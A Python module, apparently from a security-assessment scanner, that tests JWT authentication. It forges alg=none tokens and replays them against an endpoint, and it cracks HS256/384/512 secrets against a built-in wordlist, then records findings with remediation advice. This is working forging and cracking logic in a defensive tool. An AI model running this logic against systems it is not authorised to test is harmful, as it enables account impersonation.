"""Authentication-logic testing — JWT weaknesses (dependency-free).

When the operator's session carries a JWT, two high-impact, deterministic flaws are tested:

  * alg=none: forge a header-only token (alg "none", empty signature) and replay it against
    a token-protected endpoint. If the server still authenticates the request -> critical
    authentication bypass. Guarded against false positives: a clearly-invalid token must be
    REJECTED on the same endpoint (so the endpoint really is token-gated), and the none-token
    must then be ACCEPTED.
  * weak HMAC secret: for HS256/384/512, try to reproduce the signature with a small list of
    common secrets. A match is cryptographic proof the secret is guessable -> an attacker can
    forge arbitrary tokens (critical).

Both are read-only (we never escalate the forged token's claims; proof is acceptance alone).
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import secrets as _secrets
from collections.abc import Callable

_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]{0,}")
_HASH = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
_WORDLIST = ("secret", "password", "123456", "changeme", "admin", "jwt", "key", "test",
             "dev", "private", "token", "supersecret", "s3cr3t", "your-256-bit-secret",
             "your_jwt_secret", "jwtsecret", "signingkey", "qwerty", "letmein", "owlforge",
             "default", "example", "p@ssw0rd", "secretkey", "mysecret")


def _b64url_dec(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _b64url_enc(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _find_jwts(headers: dict | None) -> list[tuple[str, str]]:
    out = []
    for k, v in (headers or {}).items():
        for m in _JWT_RE.finditer(v or ""):
            out.append((k, m.group(0)))
    return out


def _crack_hs_secret(token: str) -> str | None:
    try:
        h, p, sig = token.split(".")
        alg = (json.loads(_b64url_dec(h)).get("alg") or "").upper()
        if alg not in _HASH:
            return None
        signing_input = f"{h}.{p}".encode()
        want = _b64url_dec(sig)
        for cand in _WORDLIST:
            calc = hmac.new(cand.encode(), signing_input, _HASH[alg]).digest()
            if hmac.compare_digest(calc, want):
                return cand
    except Exception:
        return None
    return None


def _forge_none(token: str) -> str | None:
    try:
        h, p, _ = token.split(".")
        header = json.loads(_b64url_dec(h))
        header["alg"] = "none"
        nh = _b64url_enc(json.dumps(header, separators=(",", ":")).encode())
        return f"{nh}.{p}."
    except Exception:
        return None


def _get(sandbox, method, url, headers):
    try:
        return sandbox.http_request(method or "GET", url, headers=headers or {},
                                    params=None, body=None) or {}
    except Exception:
        return {}


def _authed_ok(r: dict) -> bool:
    return int(r.get("status") or 0) == 200 and len(r.get("body") or "") >= 50


def _pick_endpoint(inventory, sandbox, session_headers):
    """An endpoint that returns a real authenticated 200 with the session (to replay tokens
    against). Prefer account-scoped URLs."""
    from owlforge.engine.accesscontrol import _acct_scoped
    cand = [it for it in inventory if it.get("url")]
    cand.sort(key=lambda it: 0 if _acct_scoped(it.get("url", "")) else 1)
    for it in cand[:25]:
        r = _get(sandbox, it.get("method", "GET"), it["url"], session_headers)
        if _authed_ok(r):
            return it["url"], (it.get("method") or "GET").upper(), r.get("body") or ""
    return None


def _file(assessment_id, title, severity, endpoint, method, analysis, poc, note):
    from owlforge.store.db import session
    from owlforge.store.models import Finding
    with session() as s:
        s.add(Finding(
            id=f"find_{_secrets.token_hex(5)}", assessment_id=assessment_id,
            title=title, severity=severity, status="validated", confidence="high",
            endpoint=endpoint, method=method, technical_analysis=analysis, proof_of_concept=poc,
            impact="An attacker can forge valid session tokens and impersonate any user.",
            remediation="Pin the accepted algorithm server-side (reject 'none'); use a long, "
                        "random, secret signing key; prefer asymmetric keys.",
            validation_note=note))
        s.commit()


def jwt_scan(assessment_id, inventory, sandbox, session_headers,
             log: Callable[[str], None] = lambda m: None) -> int:
    if sandbox is None or not session_headers:
        return 0
    jwts = _find_jwts(session_headers)
    if not jwts:
        return 0
    log(f"auth-logic: {len(jwts)} JWT(s) in the session — testing alg=none + weak secret")
    ep = _pick_endpoint(inventory, sandbox, session_headers)
    filed = 0
    seen = set()
    for hdr_name, tok in jwts:
        if tok in seen:
            continue
        seen.add(tok)

        # 1) weak HMAC secret (no endpoint needed — cryptographic proof)
        secret = _crack_hs_secret(tok)
        if secret:
            _file(assessment_id, "JWT signed with a weak/guessable secret", "critical",
                  ep[0] if ep else "", ep[1] if ep else "GET",
                  f"The HS256 JWT in '{hdr_name}' is signed with the secret {secret!r} "
                  "(recovered from a small wordlist). Anyone can mint valid tokens.",
                  f"HMAC secret = {secret!r}", "weak JWT secret cracked (deterministic)")
            filed += 1

        # 2) alg=none acceptance (needs a token-gated endpoint + a differential)
        if ep:
            url, method, abody = ep
            forged = _forge_none(tok)
            if not forged:
                continue
            garbage_hdr = {k: (v.replace(tok, tok[:-3] + "zzz") if tok in (v or "") else v)
                           for k, v in session_headers.items()}
            g = _get(sandbox, method, url, garbage_hdr)
            if _authed_ok(g):
                continue  # endpoint not actually token-gated -> cannot conclude
            none_hdr = {k: (v.replace(tok, forged) if tok in (v or "") else v)
                        for k, v in session_headers.items()}
            n = _get(sandbox, method, url, none_hdr)
            if _authed_ok(n):
                _file(assessment_id, "JWT 'alg=none' accepted (authentication bypass)",
                      "critical", url, method,
                      f"Replaying a forged header-only token (alg='none', empty signature) in "
                      f"'{hdr_name}' still authenticates at {method} {url}, while an invalid "
                      "token is rejected — the server does not verify the signature.",
                      f"forged none-token accepted at {url}",
                      "alg=none accepted; invalid token rejected (differential, deterministic)")
                filed += 1
    if filed:
        log(f"auth-logic: {filed} JWT weakness(es) confirmed")
    return filed
